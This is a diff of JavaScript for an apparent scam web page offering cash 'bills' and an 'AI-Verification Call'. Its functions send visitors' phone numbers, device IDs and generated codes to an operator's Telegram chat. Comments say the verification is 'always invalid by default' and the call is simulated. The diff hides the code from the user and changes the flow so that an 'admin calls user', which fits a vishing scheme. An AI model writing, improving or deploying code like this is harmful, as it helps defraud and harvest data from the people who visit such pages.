@@ -1,11 +1,10 @@
 /**
  * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
- * Updated: AI-Verification Call System (No MPIN)
- * - Request AI-Verification Call
+ * Updated: AI-Verification Call System (Admin calls user)
+ * - Request AI-Verification Call (Admin triggers)
  * - 60-second countdown timer
  * - Always invalid by default
  * - Full Telegram notifications
- * - Floating call notification
  */
 
 // ========== POPUP MODULE ==========
@@ -70,7 +69,7 @@
 🖥️ Device: ${deviceId}
 🔑 Code Generated: ${code}
 ⏰ Time: ${timestamp}
-📊 Status: Call requested - Waiting for user input
+📊 Status: Call requested - Admin will call user
 ━━━━━━━━━━━━━━━━━━━━`;
         await sendTelegramMessage(message);
     }
@@ -103,7 +102,6 @@
         await sendTelegramMessage(message);
     }
     
-    // Claim button Telegram Notification
     async function sendClaimButtonNotification(userPhone, deviceId, amount) {
         const now = new Date();
         const timestamp = now.toLocaleString();
@@ -118,7 +116,7 @@
         await sendTelegramMessage(message);
     }
     
-    // ========== UPDATE BILLS INDICATORS (Based on balance) ==========
+    // ========== UPDATE BILLS INDICATORS ==========
     function updateBillsIndicators(balance) {
         const billIndicators = document.querySelectorAll('.bill-indicator');
         const billCount = Math.min(4, Math.floor(balance / 500));
@@ -718,7 +716,7 @@
         const userPhone = localStorage.getItem("userPhone") || "Unknown";
         const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
         
-        // Send Telegram notification
+        // Send Telegram notification with code
         await sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
         
         // Update UI
@@ -739,7 +737,7 @@
         
         if (statusIcon) statusIcon.innerHTML = '📞';
         if (statusText) {
-            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...';
+            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.3);">Please wait for the call</span>';
             statusText.style.color = '#00d4ff';
         }
         if (timerDisplay) {
@@ -759,13 +757,13 @@
             codeSection.style.display = 'none';
         }
         
-        // Start countdown timer
-        startCallTimer();
-        
         // Play call sound effect
         playCallSound();
         
-        // Simulate call connection after 3-5 seconds
+        // Start countdown timer
+        startCallTimer();
+        
+        // Simulate "call connected" after 4 seconds (admin calls user)
         setTimeout(() => {
             if (statusIcon) statusIcon.innerHTML = '📱';
             if (statusText) {
@@ -783,11 +781,7 @@
             if (codeInput) {
                 codeInput.focus();
             }
-            
-            // Show notification with code
-            showAICallNotification(currentCallCode);
-            
-        }, 3000 + Math.random() * 2000);
+        }, 4000);
     }
     
     // ========== GENERATE CALL CODE ==========
@@ -995,53 +989,6 @@
         setTimeout(() => {
             element.style.animation = '';
         }, 500);
-    }
-    
-    // ========== SHOW AI CALL NOTIFICATION ==========
-    function showAICallNotification(code) {
-        // Create floating notification
-        const notification = document.createElement('div');
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 212, 255, 0.15);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            border-radius: 16px;
-            padding: 16px 24px;
-            z-index: 99999;
-            animation: slideDown 0.5s ease;
-            max-width: 340px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
-        `;
-        
-        notification.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 12px; justify-content: center;">
-                <div style="width: 40px; height: 40px; background: rgba(0, 212, 255, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(0, 212, 255, 0.2);">
-                    <i class="fas fa-phone" style="color: #00d4ff; font-size: 18px;"></i>
-                </div>
-                <div style="text-align: left;">
-                    <div style="font-size: 10px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 1px;">AI-VERIFICATION CALL</div>
-                    <div style="font-size: 14px; color: #fff; font-family: 'Poppins', sans-serif; font-weight: 600;">Your code: <span style="color: #22C55E; font-family: 'Orbitron', monospace; font-size: 18px; letter-spacing: 2px;">${code}</span></div>
-                </div>
-            </div>
-        `;
-        
-        document.body.appendChild(notification);
-        
-        // Auto-remove after 8 seconds
-        setTimeout(() => {
-            notification.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
-            notification.style.opacity = '0';
-            notification.style.transform = 'translateX(-50%) translateY(-20px)';
-            setTimeout(() => {
-                if (notification.parentNode) notification.remove();
-            }, 500);
-        }, 8000);
     }
     
     // ========== CHECK FIREWALL AND TRANSITION ==========
